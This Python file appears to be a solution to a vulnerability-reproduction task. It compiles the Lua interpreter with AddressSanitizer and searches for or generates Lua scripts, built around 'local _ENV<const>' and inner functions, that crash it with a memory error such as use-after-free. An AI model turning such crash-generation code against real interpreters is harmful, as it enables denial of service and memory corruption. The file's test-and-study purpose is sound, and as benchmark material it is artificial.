import os
import re
import tarfile
import tempfile
import shutil
import subprocess
from pathlib import Path
from typing import Optional, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        workdir = tempfile.mkdtemp(prefix="pocgen_lua_")
        try:
            root = self._prepare_sources(src_path, workdir)
            best = self._find_candidate_poc_from_tree(root)

            lua_bin = self._build_lua_asan(root)
            if lua_bin:
                if best:
                    if self._triggers_asan(lua_bin, best):
                        return best
                discovered = self._discover_poc(lua_bin)
                if discovered:
                    return discovered
                if best:
                    return best

            return self._fallback_poc()
        finally:
            shutil.rmtree(workdir, ignore_errors=True)

    def _prepare_sources(self, src_path: str, workdir: str) -> Path:
        p = Path(src_path)
        if p.is_dir():
            return p.resolve()

        extract_dir = Path(workdir) / "src"
        extract_dir.mkdir(parents=True, exist_ok=True)
        with tarfile.open(str(p), "r:*") as tf:
            self._safe_extract(tf, extract_dir)

        entries = [x for x in extract_dir.iterdir() if x.name not in (".", "..")]
        if len(entries) == 1 and entries[0].is_dir():
            return entries[0].resolve()
        return extract_dir.resolve()

    def _safe_extract(self, tf: tarfile.TarFile, path: Path) -> None:
        base = path.resolve()
        members = tf.getmembers()
        safe_members = []
        for m in members:
            name = m.name
            if not name or name == ".":
                continue
            target = (base / name).resolve()
            try:
                target.relative_to(base)
            except Exception:
                continue
            safe_members.append(m)
        tf.extractall(path=str(base), members=safe_members)

    def _find_candidate_poc_from_tree(self, root: Path) -> Optional[bytes]:
        best_score = -1
        best_bytes = None
        target_len = 1181

        key_env = b"_ENV"
        key_const = b"<const>"

        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                lfn = fn.lower()
                if not (lfn.endswith(".lua") or lfn.endswith(".txt") or "poc" in lfn or "crash" in lfn or "repro" in lfn):
                    continue
                fp = Path(dirpath) / fn
                try:
                    st = fp.stat()
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > 200000:
                    continue
                try:
                    data = fp.read_bytes()
                except Exception:
                    continue
                if b"\x00" in data:
                    continue
                if key_env not in data or b"const" not in data:
                    continue

                score = 0
                cnt_env = data.count(key_env)
                cnt_const = data.count(key_const)
                score += 10 * min(cnt_env, 20)
                score += 30 * min(cnt_const, 20)
                if b"_ENV<const>" in data or b"_ENV <const>" in data:
                    score += 200
                path_l = str(fp).lower()
                for kw, w in (("poc", 120), ("crash", 120), ("repro", 90), ("oss-fuzz", 90), ("corpus", 70), ("fuzz", 50), ("test", 30)):
                    if kw in path_l:
                        score += w
                dl = abs(len(data) - target_len)
                score += max(0, 300 - (dl // 4))

                if score > best_score:
                    best_score = score
                    best_bytes = data

        return best_bytes

    def _find_lua_src_dir(self, root: Path) -> Optional[Path]:
        best = None
        best_depth = 10**9
        for dirpath, _, filenames in os.walk(root):
            fnset = set(filenames)
            if "lapi.c" in fnset and "lparser.c" in fnset and "llex.c" in fnset and "lua.c" in fnset:
                p = Path(dirpath)
                depth = len(p.relative_to(root).parts)
                if depth < best_depth:
                    best = p
                    best_depth = depth
        return best

    def _build_lua_asan(self, root: Path) -> Optional[Path]:
        srcdir = self._find_lua_src_dir(root)
        if not srcdir:
            return None

        cc = shutil.which("clang") or shutil.which("gcc") or shutil.which("cc")
        if not cc:
            return None

        outdir = Path(tempfile.mkdtemp(prefix="lua_build_", dir=str(root)))
        lua_bin = outdir / "lua_asan"

        c_files = []
        onelua = srcdir / "onelua.c"
        if onelua.exists():
            c_files = [str(onelua), str(srcdir / "lua.c")]
        else:
            for fp in sorted(srcdir.glob("*.c")):
                name = fp.name
                if name in ("luac.c", "ltests.c"):
                    continue
                c_files.append(str(fp))

        cflags = ["-O1", "-g", "-fno-omit-frame-pointer", "-DLUA_USE_LINUX", f"-I{str(srcdir)}"]
        ldflags = ["-lm", "-ldl"]

        can_asan = True
        asan_flags = ["-fsanitize=address"]
        if os.path.basename(cc) == "clang":
            asan_flags += ["-fsanitize-address-use-after-scope"]
        cmd = [cc] + cflags + asan_flags + c_files + ldflags + ["-o", str(lua_bin)]

        env = os.environ.copy()
        env.pop("CFLAGS", None)
        env.pop("LDFLAGS", None)

        try:
            r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, timeout=120)
            if r.returncode != 0 or not lua_bin.exists():
                can_asan = False
        except Exception:
            can_asan = False

        if can_asan:
            return lua_bin

        lua_bin2 = outdir / "lua"
        cmd2 = [cc] + cflags + c_files + ldflags + ["-o", str(lua_bin2)]
        try:
            r = subprocess.run(cmd2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, timeout=120)
            if r.returncode == 0 and lua_bin2.exists():
                return lua_bin2
        except Exception:
            pass

        return None

    def _run_lua(self, lua_bin: Path, program: bytes, timeout: float = 2.0) -> Tuple[int, bytes, bytes]:
        with tempfile.NamedTemporaryFile(prefix="poc_", suffix=".lua", delete=False) as f:
            f.write(program)
            f.flush()
            fname = f.name
        try:
            env = os.environ.copy()
            env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "")
            if env["ASAN_OPTIONS"]:
                env["ASAN_OPTIONS"] += ":"
            env["ASAN_OPTIONS"] += "detect_leaks=0:abort_on_error=1:allocator_may_return_null=1"
            p = subprocess.run(
                [str(lua_bin), fname],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=env,
                timeout=timeout,
            )
            return p.returncode, p.stdout, p.stderr
        finally:
            try:
                os.unlink(fname)
            except Exception:
                pass

    def _is_asan_crash(self, rc: int, err: bytes) -> bool:
        if rc < 0:
            return True
        e = err.lower()
        if b"addresssanitizer" in e:
            return True
        if b"heap-use-after-free" in e or b"use-after-free" in e:
            return True
        if b"runtime error" in e and b"sanitizer" in e:
            return True
        return False

    def _triggers_asan(self, lua_bin: Path, program: bytes) -> bool:
        try:
            rc, _, err = self._run_lua(lua_bin, program, timeout=2.0)
        except Exception:
            return False
        return self._is_asan_crash(rc, err)

    def _ident_base26(self, n: int) -> str:
        s = []
        n += 1
        while n > 0:
            n -= 1
            s.append(chr(ord('a') + (n % 26)))
            n //= 26
        return "".join(reversed(s))

    def _varnames(self, count: int, skip: Optional[set] = None) -> List[str]:
        if skip is None:
            skip = set()
        res = []
        i = 0
        while len(res) < count:
            name = self._ident_base26(i)
            i += 1
            if name in skip:
                continue
            if name in ("_env", "_ENV"):
                continue
            if re.fullmatch(r"\d+", name):
                continue
            res.append(name)
        return res

    def _make_payload(self, n: int, family: int) -> bytes:
        n = max(0, int(n))
        if n > 195:
            n = 195

        names = self._varnames(n, skip={"a", "f", "o"})
        vars_part = ",".join(names) if names else ""

        if family == 0:
            # locals after inner function
            s = "local function o()local _ENV<const>={}local function f()return a end;"
            if vars_part:
                s += "local " + vars_part + ";"
            s += "f()end;o()"
            return (s + "\n").encode("utf-8")

        if family == 1:
            # locals before inner function
            s = "local function o()local _ENV<const>={};"
            if vars_part:
                s += "local " + vars_part + ";"
            s += "local function f()return a end;f()end;o()"
            return (s + "\n").encode("utf-8")

        if family == 2:
            # multiple inner functions
            s = "local function o()local _ENV<const>={}local function f()return a end;local function g()return a end;"
            if vars_part:
                s += "local " + vars_part + ";"
            s += "f();g()end;o()"
            return (s + "\n").encode("utf-8")

        # family == 3 (do-block)
        s = "do local _ENV<const>={}local function f()return a end;"
        if vars_part:
            s += "local " + vars_part + ";"
        s += "f()end"
        return (s + "\n").encode("utf-8")

    def _discover_poc(self, lua_bin: Path) -> Optional[bytes]:
        families = [0, 3, 2, 1]
        trial_ns = [4, 8, 12, 16, 20, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 144, 160, 176, 190]
        for fam in families:
            last_ok = 0
            for n in trial_ns:
                payload = self._make_payload(n, fam)
                if self._triggers_asan(lua_bin, payload):
                    lo = last_ok
                    hi = n
                    while hi - lo > 1:
                        mid = (lo + hi) // 2
                        mp = self._make_payload(mid, fam)
                        if self._triggers_asan(lua_bin, mp):
                            hi = mid
                        else:
                            lo = mid
                    return self._make_payload(hi, fam)
                else:
                    last_ok = n
        return None

    def _fallback_poc(self) -> bytes:
        return self._make_payload(190, 0)